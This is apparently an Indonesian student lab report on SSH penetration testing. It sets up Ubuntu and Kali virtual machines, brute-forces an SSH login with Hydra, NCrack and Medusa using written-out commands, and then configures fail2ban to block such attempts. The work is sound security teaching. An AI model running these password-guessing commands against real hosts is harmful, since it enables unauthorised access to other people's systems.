<b> TUGAS 1 PKSJ </b>
# Uji Penetrasi

## Anggota Kelompok :
1. Aldi Febriansyah - 5114100015
1. Trastian Satria W - 5114100016
1. Kevin A Fachreza - 5114100128

## Uji Penetrasi 1
### Install
#### Install Ubuntu Server

1. Download Ubuntu
1. Buka Virtual Box
1. Pilih New
1. Masukkan nama, dan pilih tipe ubuntu
1. Masukkan jumlah RAM sesuai kebutuhan
1. Pilih Create Virtual Hardisk Now
1. Pilih VHD
1. Pilih Fixed Size
1. Masukkan Ukuran Hardisk, sesuai kebutuhan
1. Pilih ISO Ubuntu
1. Klik Install
1. Setelah Install, ikuti menu Onboarding sesuai pada ubuntu

#### Install Kali Linux

1. Download Kali Linux
1. Buka Virtual Box
1. Pilih New
1. Masukkan nama, dan pilih tipe Linux
1. Masukkan jumlah RAM sesuai kebutuhan
1. Pilih Create Virtual Hardisk Now
1. Pilih VHD
1. Pilih Fixed Size
1. Masukkan Ukuran Hardisk, sesuai kebutuhan
1. Pilih ISO Kali Linux
1. Klik Install
1. Setelah Install, ikuti menu Onboarding sesuai pada Kali

#### Install SSH Server

Pada instalasi ubuntu server, kami sudah meng include install openssh pada server. Namun untuk menginstall secara manual bisa menggunakan cara dibawah.

1. Untuk install ssh server ketik
```
sudo apt-get install openssh-server
```

2. Cek jika install berhasil menggunakan command berikut
```
service ssh status
```
https://user-images.githubusercontent.com/17487644/32114550-0fdae0cc-bb6e-11e7-8987-bf3d03952e06.PNG
#### Install Tools Medusa, THC-Hydra, NCrack

1. THC-Hydra, NCrack, dan Medusa merupakan tools default Kali, sehingga tidak perlu install

### Brute Force Menggunakan Tools

#### Hydra

1. Hydra membutuhkan list password, maka dibuat file password bernama """""""
1. Jalankan Hydra
```
hydra -l ubuntuserver -P '/root/Desktop/passw.txt' 192.168.1.8 -t 4 ssh
```
![alt text](https://github.com/kevinfachreza/pksj/blob/master/pksj/no%20counter/1hydra.PNG?raw=true)

#### NCrack

1. Jalankan NCrack

```
ncrack -p 22 --user ubuntuserver -P '/root/Desktop/passw.txt' 192.168.1.8 
```
![alt text](https://github.com/kevinfachreza/pksj/blob/master/pksj/no%20counter/2-ncrack.PNG?raw=true)

#### Medusa

1. Jalankan Medusa

```
medusa -u ubuntuserver -P '/root/Desktop/passw.txt' -h 192.168.1.8 -M ssh 
```
![alt text](https://github.com/kevinfachreza/pksj/blob/master/pksj/no%20counter/med1.PNG?raw=true)
![alt text](https://github.com/kevinfachreza/pksj/blob/master/pksj/no%20counter/med2.PNG?raw=true)

#### Uji Masuk SSH
1. Masuk ke SSH

```
ssh ubuntuserver@192.168.1.8
```
![alt text](https://github.com/kevinfachreza/pksj/blob/master/pksj/no%20counter/coba%20masuk%20ssh%20server.PNG?raw=true)


## Uji Penetrasi 2

1. Install fail2ban

```
sudo apt-get install fail2ban
```

2. Buka konfigurasi fail2ban

```
sudo nano /etc/fail2ban/jail.conf
```

3. Atur bantime. Bantime merupakan lamanya waktu jika host di ban
4. Atur maxretry. Max retry merupakan maksimal percobaan gagal
5. Atur findtime. Findtime merupakan waktu diantara percobaan gagal 1 dan terakhir.

6. Cek Iptables

```
sudo iptables -S
```

7. Restart fail2ban

```
sudo service fail2ban start
```

8. Lihat perubahan iptables

